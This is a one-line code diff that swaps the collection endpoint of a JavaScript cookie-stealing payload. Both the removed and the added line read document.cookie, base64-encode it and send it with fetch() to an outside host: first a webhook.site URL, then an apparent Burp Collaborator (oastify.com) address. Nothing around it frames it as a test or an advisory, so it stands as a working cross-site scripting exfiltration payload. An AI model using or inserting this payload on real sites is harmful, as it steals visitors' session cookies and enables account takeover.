@@ -1,1 +1,1 @@
-fetch('https://webhook.site/0fa6ab36-5615-4c5d-9e7a-2f1d8cecbe65?c=' + btoa(unescape(encodeURIComponent(document.cookie))));
+fetch('https://grblxrk6x4mp79gd6m5beqlcu30uokc9.oastify.com?c=' + btoa(unescape(encodeURIComponent(document.cookie))));
